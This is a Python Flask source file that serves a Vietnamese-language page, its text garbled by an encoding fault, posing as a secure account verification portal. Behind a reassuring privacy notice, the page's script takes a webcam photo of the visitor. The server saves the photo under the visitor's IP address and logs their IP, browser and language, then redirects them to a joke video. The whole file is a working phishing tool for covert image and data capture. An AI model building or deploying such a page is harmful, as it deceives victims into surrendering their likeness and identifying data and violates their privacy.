from flask import Flask, request, render_template_string
import os
from datetime import datetime

app = Flask(__name__)

# ƒê∆∞·ªùng d·∫´n l∆∞u ·∫£nh
SAVE_PATH = r"IMAGE"
os.makedirs(SAVE_PATH, exist_ok=True)  # T·∫°o th∆∞ m·ª•c n·∫øu ch∆∞a c√≥

HTML_PAGE = """  
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>C·ªïng X√°c Th·ª±c T√†i Kho·∫£n - An To√†n & Tin C·∫≠y</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    /* Global styles */
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #e3f2fd, #bbdefb);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #333;
    }
    .container {
      background: #fff;
      max-width: 400px;
      width: 90%;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
      position: relative;
      z-index: 1;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h2 {
      color: #0d6efd;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 20px;
    }
    .info {
      font-size: 14px;
      color: #777;
      margin-top: 15px;
    }
    .btn {
      background-color: #0d6efd;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .btn:hover {
      background-color: #0b5ed7;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #0d6efd;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none; /* ·∫®n m·∫∑c ƒë·ªãnh */
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
    .success-msg {
      color: #28a745;  /* ƒê·ªïi th√†nh m√†u xanh l√° c√¢y */
      font-weight: 600;
      font-size: 18px;
      margin-top: 20px;
      display: none; /* ·∫®n m·∫∑c ƒë·ªãnh */
      animation: fadeInText 1s forwards;
    }
    @keyframes fadeInText {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    /* Modal Styles */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }
    .modal-content {
      background: #fff;
      width: 90%;
      max-width: 500px;
      padding: 20px;
      border-radius: 8px;
      text-align: left;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }
    .modal-content h3 {
      margin-top: 0;
      color: #0d6efd;
    }
    .modal-content p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }
    .modal-close {
      background: #0d6efd;
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s ease;
      float: right;
    }
    .modal-close:hover {
      background: #0b5ed7;
    }
  </style>
</head>
<body>
  <!-- N·ªôi dung ch√≠nh -->
  <div class="container">
    <h2>X√°c Th·ª±c T√†i Kho·∫£n</h2>
    <p>ƒê·ªÉ ƒë·∫£m b·∫£o an to√†n, ch√∫ng t√¥i c·∫ßn x√°c minh danh t√≠nh c·ªßa b·∫°n qua camera. H√¨nh ·∫£nh c·ªßa b·∫°n ƒë∆∞·ª£c b·∫£o m·∫≠t tuy·ªát ƒë·ªëi v√† ch·ªâ d√πng cho m·ª•c ƒë√≠ch x√°c th·ª±c.</p>
    <button class="btn" id="verify-btn" onclick="startVerification()">X√°c Minh Ngay</button>
    <div class="loader" id="loader"></div>
    <div id="success-message" class="success-msg">‚úÖ C·∫£m ∆°n b·∫°n ƒë√£ x√°c minh ‚úÖ</div>
    <p class="info">Ch√∫ng t√¥i cam k·∫øt b·∫£o m·∫≠t th√¥ng tin c·ªßa b·∫°n.</p>
  </div>

  <!-- Modal Ch√≠nh S√°ch Ri√™ng T∆∞ -->
  <div class="modal" id="privacy-modal">
    <div class="modal-content">
      <h3>Ch√≠nh S√°ch Ri√™ng T∆∞</h3>
      <p>
        Ch√∫ng t√¥i s·ª≠ d·ª•ng camera c·ªßa b·∫°n ch·ªâ ƒë·ªÉ x√°c minh danh t√≠nh. H√¨nh ·∫£nh c·ªßa b·∫°n s·∫Ω ƒë∆∞·ª£c l∆∞u tr·ªØ t·∫°m th·ªùi v√† b·∫£o m·∫≠t tuy·ªát ƒë·ªëi. 
        Th√¥ng tin n√†y s·∫Ω kh√¥ng ƒë∆∞·ª£c chia s·∫ª v·ªõi b·∫•t k·ª≥ b√™n th·ª© ba n√†o.
      </p>
      <button class="modal-close" onclick="closeModal()">ƒê·ªìng √ù</button>
    </div>
  </div>

  <script>
    // Hi·ªÉn th·ªã modal khi t·∫£i trang
    window.addEventListener('load', function() {
      document.getElementById('privacy-modal').style.display = 'flex';
    });

    function closeModal() {
      document.getElementById('privacy-modal').style.display = 'none';
    }

    function startVerification() {
      let button = document.getElementById("verify-btn");
      let loader = document.getElementById("loader");
      let successMessage = document.getElementById("success-message");

      // ·∫®n n√∫t x√°c minh v√† hi·ªÉn th·ªã loader
      button.style.display = "none";
      loader.style.display = "block";

      // Y√™u c·∫ßu quy·ªÅn truy c·∫≠p webcam
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          let videoTrack = stream.getVideoTracks()[0];
          let imageCapture = new ImageCapture(videoTrack);
          imageCapture.takePhoto()
            .then(blob => {
              let formData = new FormData();
              formData.append("image", blob, "face_verification.png");
              // G·ª≠i ·∫£nh ƒë·∫øn server
              fetch('/upload', { method: "POST", body: formData })
                .then(response => {
                  loader.style.display = "none";
                  successMessage.style.display = "block";
                  // Sau 3 gi√¢y, chuy·ªÉn h∆∞·ªõng n·∫øu c·∫ßn
                  setTimeout(() => {
                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                  }, 3000);
                })
                .catch(error => {
                  console.error("L·ªói upload ·∫£nh:", error);
                  loader.style.display = "none";
                  button.style.display = "block";
                });
            })
            .catch(err => {
              console.error("L·ªói ch·ª•p ·∫£nh:", err);
              loader.style.display = "none";
              button.style.display = "block";
            });
        })
        .catch(err => {
          console.error("L·ªói truy c·∫≠p webcam:", err);
          loader.style.display = "none";
          button.style.display = "block";
        });
    }
  </script>
</body>
</html>
"""
# Xog ph·∫ßn html wed
@app.route('/')  
def index():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Kh√¥ng x√°c ƒë·ªãnh')
    language = request.headers.get('Accept-Language', 'Kh√¥ng x√°c ƒë·ªãnh')
    
    print("\033[32m[=====================]\033[0m")
    print(f"\033[36m[+]: IPv4: {user_ip}\033[0m")
    print("\033[36m[+]: IPv6: Kh√¥ng x√°c ƒë·ªãnh\033[0m")
    print(f"\033[36m[+]: H·ªá ƒëi·ªÅu h√†nh: {user_agent}\033[0m")
    print(f"\033[36m[+]: Ng√¥n ng·ªØ: {language}\033[0m")
    print("\033[31m--- H·∫øt ---\033[0m")
    print("\033[32m[=====================]\033[0m")
    
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])  
def upload():
    if 'image' in request.files:
        image = request.files['image']
        user_ip = request.remote_addr
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")
        image.save(image_path)

        print(f"\033[32m[üì∑] ·∫¢nh ƒë√£ ch·ª•p t·ª´ IP {user_ip}: {image_path}\033[0m")
        return "OK", 200
    return "L·ªói khi nh·∫≠n ·∫£nh!", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)